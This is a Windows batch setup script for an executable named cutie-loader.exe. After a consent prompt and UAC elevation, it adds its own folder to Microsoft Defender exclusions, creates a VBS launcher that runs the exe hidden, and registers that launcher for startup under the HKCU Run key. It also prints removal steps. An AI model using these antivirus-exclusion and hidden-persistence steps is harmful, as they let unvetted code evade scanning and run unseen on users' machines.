```bat
@echo off
title Cutie Loader - Startup & Exclusion Setup
color 0A
setlocal EnableExtensions

echo.
echo ============================================================
echo                 CUTIE LOADER SETUP
echo ============================================================
echo.
echo This setup will make the following changes to Windows:
echo.
echo  1. Request Administrator permission through UAC.
echo.
echo  2. Unblock this executable:
echo     %~dp0cutie-loader.exe
echo.
echo  3. Add this folder to Microsoft Defender exclusions:
echo     %~dp0
echo.
echo  4. Create a launcher file:
echo     %~dp0launch_cutie_loader.vbs
echo     This launcher starts cutie-loader.exe with its window hidden.
echo.
echo  5. Add the launcher to Windows startup for the current user.
echo     Registry location:
echo     HKCU\Software\Microsoft\Windows\CurrentVersion\Run
echo     Value name:
echo     CutieLoader
echo.
echo  6. Start cutie-loader.exe immediately after setup finishes.
echo.
echo ============================================================
echo.

set "answer="
set /p "answer=Continue with these changes? [Y/Yes to continue, N/No to cancel]: "

if /i "%answer%"=="n" goto :cancel
if /i "%answer%"=="no" goto :cancel

echo.
echo Proceeding with setup...
echo.

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Administrator permission is required.
    echo Requesting Administrator permission...
    powershell -NoProfile -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

cd /d "%~dp0"

echo Working directory:
echo %cd%
echo.

if not exist "cutie-loader.exe" (
    echo ERROR: cutie-loader.exe was not found in this folder.
    echo.
    pause
    exit /b 1
)

echo Unblocking cutie-loader.exe...
powershell -NoProfile -Command "Unblock-File -LiteralPath '%~dp0cutie-loader.exe'" >nul 2>&1

if %errorlevel% equ 0 (
    echo Done.
) else (
    echo WARNING: Windows could not unblock the executable.
)

echo.
echo Adding this folder to Microsoft Defender exclusions...
echo %~dp0

powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%~dp0'" >nul 2>&1

if %errorlevel% equ 0 (
    echo Defender exclusion added successfully.
) else (
    echo WARNING: Defender exclusion could not be added.
)

echo.
echo Creating hidden startup launcher...

set "vbs=%~dp0launch_cutie_loader.vbs"

if exist "%vbs%" del /q "%vbs%" >nul 2>&1

(
    echo Set WshShell = CreateObject("WScript.Shell"^)
    echo WshShell.CurrentDirectory = "%~dp0"
    echo WshShell.Run """%~dp0cutie-loader.exe""", 0, False
) > "%vbs%"

if exist "%vbs%" (
    echo Launcher created successfully:
    echo %vbs%
) else (
    echo ERROR: Failed to create the launcher.
    pause
    exit /b 1
)

echo.
echo Adding CutieLoader to Windows startup...

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "CutieLoader" /t REG_SZ /d "\"%vbs%\"" /f >nul 2>&1

if %errorlevel% equ 0 (
    echo Startup entry added successfully.
) else (
    echo ERROR: Failed to add the startup entry.
    pause
    exit /b 1
)

echo.
echo Starting cutie-loader.exe now...

start "" "%~dp0cutie-loader.exe"

if %errorlevel% equ 0 (
    echo Loader started successfully.
) else (
    echo WARNING: Windows could not start cutie-loader.exe.
)

echo.
echo ============================================================
echo                     SETUP COMPLETE
echo ============================================================
echo.
echo The following setup has been applied:
echo.
echo  - cutie-loader.exe was unblocked.
echo  - Microsoft Defender exclusion:
echo    %~dp0
echo  - Hidden launcher created:
echo    %vbs%
echo  - Windows startup entry created:
echo    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
echo    CutieLoader
echo  - cutie-loader.exe was started for this session.
echo.
echo The loader will also start automatically when the current
echo user logs into Windows.
echo.
echo To remove the startup entry:
echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v CutieLoader
echo.
echo To remove the Defender exclusion:
echo powershell -Command "Remove-MpPreference -ExclusionPath '%~dp0'"
echo.
echo To remove the launcher:
echo del "%vbs%"
echo.
echo ============================================================
pause
exit /b 0

:cancel
echo.
echo Setup cancelled.
echo No changes were made.
echo.
pause
exit /b 0
```
